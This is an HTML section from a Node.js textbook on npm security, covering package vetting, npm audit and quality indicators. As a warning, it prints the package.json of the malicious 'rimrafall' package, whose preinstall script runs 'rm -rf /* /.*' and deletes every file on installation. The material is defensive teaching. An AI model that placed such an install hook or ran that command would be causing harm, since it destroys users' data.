<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
                    
        <head><meta content="application/xhtml+xml; charset=utf-8" http-equiv="Content-Type"/>
            <meta content="application/xhtml+xml; charset=utf-8" name="content-type"/>
            <meta content="Security" name="title"/>
            <meta content="Sebastian Springer" name="author"/>
            <meta content="Rheinwerk Publishing" name="publisher"/>
            <meta content="© 2022 by Rheinwerk Publishing Inc., Boston (MA)" name="copyright"/>
            <meta content="Node.js - The Comprehensive Guide - Security" name="description"/>
            <meta content="en" name="language"/>
            <title>Security</title>
            <link href="common/main.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:e0000000-0000-0000-0000-000029756394" name="Adept.expected.resource"/>
        </head>
    


                    <body class="office_us type_kapitel">
                        <div id="main">
        <h2 class="t2" id="h24.3">24.3    Node Package Manager Security<a class="indexanchor" id="i24_68"/></h2>
        <p class="standard">As previously mentioned, npm poses a security risk that shouldn’t be underestimated. To demonstrate this, there was a package called <samp class="listingcharacter listingcharacter">rimrafall</samp><a class="indexanchor" id="i24_69"/> in the npm repository some time ago. This package served no other purpose than to run <samp class="listingcharacter listingcharacter">rm -rf /* /.*</samp> on a machine and thus delete all files. The following sections describe in detail how this works. However, this action caused many people to now question the trustworthiness of npm packages before installing them.</p>
        
            <h3 class="t3" id="h24.3.1">24.3.1    Permissions<a class="indexanchor" id="i24_70"/></h3>
            <p class="standard">The npm is a very powerful tool, and for this very reason, you should be very careful when using it in conjunction with your computer’s administrator account<a class="indexanchor" id="i24_71"/>. A <samp class="listingcharacter listingcharacter">sudo npm install paketX</samp> on a Unix system will cause the process to run as administrator and allow the application to access the entire system and perform any kind of operation during the installation. Because you can usually only perform a system-wide installation of a package under the administrator user—unless you use tools such as Node Version Manager (nvm)<a class="indexanchor" id="i24_72"/>—this unfortunately can’t be avoided completely. However, most packages can also be used locally. For this purpose, you either run the executable directly from the <span class="italic">node_modules/.bin</span> directory, or you use <samp class="listingcharacter listingcharacter">npx</samp> to execute the command. In any case, you should only install trusted packages globally. However, how do you find out whether a package is a legitimate application or potential malware? A first step is to take a look at the <span class="url"><a href="http://npmjs.com">npmjs.com</a></span> repository. Here you can see how many times a package has been downloaded recently. High download numbers indicate frequently used packages. The next place to go is the repository of the package, which is usually located on GitHub. Here you can take a look into the source code of the package. You should at least have a look at the <span class="italic">package.json</span> file. The best way to complete your initial research is to search for the package in the search engine of your choice. In addition, it’s recommended to check for security issues or malware in connection with the package. If these checks are satisfactory, there should actually be no problem with the software. However, you can be completely sure only if you check the source code completely. For packages such as Express or Pug, however, that entails a lot of work. You should also keep in mind that, in this case, you need to check not only the package itself but also its dependencies.</p>
        
        
            <h3 class="t3" id="h24.3.2">24.3.2    <a id="p705"/>Node Security Platform<a class="indexanchor" id="i24_73"/></h3>
            <p class="standard">In spring 2018, npm Inc. purchased the <span class="italic">Node Security Platform</span> (nsp) and integrated another significant feature in the npm toolset. ^Lift Security, which operates the nsp, specializes in the security of npm packages as well as security audits of the platform itself.</p>
            <p class="standard">The nsp consists of two parts: a command-line tool<a class="indexanchor" id="i24_74"/> and a web page. You can use the command-line tool to scan your application for known security leaks. This security feature has now found its way directly into npm. When you run the <samp class="listingcharacter listingcharacter">npm audit</samp> command in the root directory of your application, you’ll obtain a report of known issues. You can also integrate this audit into your continuous integration system. In addition to the standard output, <samp class="listingcharacter listingcharacter">npm audit</samp> also supports a report in JavaScript Object Notation (JSON) format, which you can enable via the <samp class="listingcharacter listingcharacter">--json</samp> option. You can then process the result further.</p>
            <p class="standard">The second part of the nsp—the security issues database—contains all npm packages with known security gaps<a class="indexanchor" id="i24_75"/>. This list is managed in the npm registry itself. You can view the list at <span class="url"><a href="http://www.npmjs.com/advisories">www.npmjs.com/advisories</a></span>. The command-line tool makes use of this database to generate its reports.</p>
        
        
            <h3 class="t3" id="h24.3.3">24.3.3    Quality Aspect<a class="indexanchor" id="i24_76"/></h3>
            <p class="standard">While you’re in the process of checking packages, you can already see the next problem. As you’ve seen in <span class="crossreference "><a href="21_001.html#h21">Chapter 21</a></span>, it’s very easy to publish packages via the <span class="italic">npmjs.com</span> repository. There is no quality control whatsoever, as is the case with Google and Apple stores, for example. Once you have a user account, you can publish your packages. Packages are removed from the registry only in case of serious violations. So far, this openness to everyone has enabled a rapid growth in the number of packages in the repository. There are some indicators that can give you clues about the quality of a package:</p>
            <ul>
                <li>
                    <p class="standard first-item last-item"><span class="bold">Repository</span><a class="indexanchor" id="i24_77"/><br/>If a repository is stored for a package, you can further analyze the quality of the package. It’s considered an antipattern in the Node.js world to release packages without a deposited repository.</p>
                </li>
                <li>
                    <p class="standard first-item last-item"><span class="bold">Documentation</span><a class="indexanchor" id="i24_78"/><br/>The minimal form of documentation consists of a <span class="italic">README.md</span> file in the root directory of the project. This is where both the installation and use of the package is normally explained. If a package doesn’t have any documentation, this is considered bad style. You should only use such packages if there are no alternatives available. If the developer hasn’t written any documentation, this is usually the least of the problems.</p>
                </li>
                <li>
                    <p class="standard first-item last-item"><span class="bold"><a id="p706"/>Tests</span><a class="indexanchor" id="i24_79"/><br/>If the project comprises unit tests, they are automatically executed by TravisCI, and if there’s a code coverage report, this is already a good indicator for a certain quality standard of the development team. Testing is as important as documentation when it comes to public npm packages. The absence of tests should also be an exclusion criterion for a package. For an in-depth review, you should look at some tests to see how they are worded and what exactly they test to get an idea of their quality.</p>
                </li>
                <li>
                    <p class="standard first-item last-item"><span class="bold">Commit statistics</span><a class="indexanchor" id="i24_80"/><br/>If the last commit was more than half a year ago, you should also take a closer look. Either it’s a very simple package that can no longer be developed further, which happens only very rarely, or the project is no longer being actively developed. If development stalls, the package is no longer adapted to newer Node.js versions, and there won’t be any new security updates.</p>
                </li>
                <li>
                    <p class="standard first-item last-item"><span class="bold">Contributors<br/></span>Another good metric is the number of contributors<a class="indexanchor" id="i24_81"/>, that is, people involved in the development of the package. The more people are involved, the better. The reason is that the project management workload can be spread across multiple shoulders, and the project team is more responsive.</p>
                </li>
                <li>
                    <p class="standard first-item last-item"><span class="bold">Issues</span><a class="indexanchor" id="i24_82"/><br/>Most projects manage bug reports and feature requests in the issue tracker of GitHub. Here you get a good impression of the way issues are handled. If there are many tickets that haven’t been processed in a very long time, this isn’t a good sign. A quick and professional response, open discussion culture, and quick provision of security updates in case of problems should be the rule.</p>
                </li>
            </ul>
            <p class="standard">Of course, you can only be completely sure about a package if you check the entire source code, but in real life, this is rarely possible. However, you should perform a cursory examination of the packages you want to use prior to installing and using them.</p>
        
        
            <h3 class="t3" id="h24.3.4">24.3.4    Node Package Manager Scripts<a class="indexanchor" id="i24_83"/></h3>
            <p class="standard">As you know, in the <span class="italic">package.json</span><a class="indexanchor" id="i24_84"/> file of a package, you can specify different scripts to be run at different times in the life cycle of a package. These scripts pose a risk that shouldn’t be underestimated. To demonstrate this, the <samp class="listingcharacter listingcharacter">rimrafall</samp><a class="indexanchor" id="i24_85"/> package was created. You’ve already come across this package in <span class="crossreference "><a href="21_001.html#h21">Chapter 21</a></span>, when we discussed the various npm scripts. Be absolutely sure <span class="italic">not</span> to install any such package on your system! In <span class="crossreference "><a href="24_003.html#l24.25">Listing 24.25</a></span>, you can see the <span class="italic">package.json</span> file of this malicious package.</p>
            <div class="listing " id="l24.25"><pre><span class="schwarz">{</span><br/>  <span class="hellblau">"name"</span><span class="schwarz">: </span><span class="hellblau">"rimrafall"</span><span class="schwarz">,</span><br/>  <span class="hellblau">"version"</span><span class="schwarz">: </span><span class="hellblau">"1.0.0"</span><span class="schwarz">,</span><br/>  <span class="hellblau">"description"</span><span class="schwarz">: </span><span class="hellblau">"rm -rf /* # DO NOT INSTALL THIS"</span><span class="schwarz">,</span><br/>  <span class="hellblau">"main"</span><span class="schwarz">: </span><span class="hellblau">"index.js"</span><span class="schwarz">,</span><br/><a id="p707"/>  <span class="hellblau">"scripts"</span><span class="schwarz">: {</span><br/>    <span class="hellblau">"preinstall"</span><span class="schwarz">: </span><span class="hellblau">"rm -rf /* /.*"</span><span class="schwarz"><br/></span>  },<br/>  <span class="hellblau">"keywords"</span><span class="schwarz">: [</span><br/>    <span class="hellblau">"rimraf"</span><span class="schwarz">,</span><br/>    <span class="hellblau">"rmrf"</span><span class="schwarz"><br/></span>  ],<br/>  <span class="hellblau">"author"</span><span class="schwarz">: </span><span class="hellblau">"João Jerónimo"</span><span class="schwarz">,</span><br/>  <span class="hellblau">"license"</span><span class="schwarz">: </span><span class="hellblau">"ISC"</span><span class="schwarz"><br/></span>} <span class="schwarz"/></pre></div>
            <p class="caption "><b>Listing 24.25</b>    
            “package.json” File of the “rimrafall” Package</p>
            <p class="standard">The command specified here as a <samp class="listingcharacter listingcharacter">preinstall</samp><a class="indexanchor" id="i24_86"/> script is executed when the package is installed and causes all files on the system to be deleted. Here you can see again why you shouldn’t run <samp class="listingcharacter listingcharacter">npm install</samp> as an administrator of a system, if possible. In this case, the installation scripts are also executed with the permissions of the administrator user, which has fatal consequences in such a deletion process.</p>
            <p class="standard">The ecosystem npm offers you is indispensable when developing applications, but you should still act with caution when using packages and carefully check what you install.</p>
        
    </div><p class="signatur"/>
                    </body>
                </html>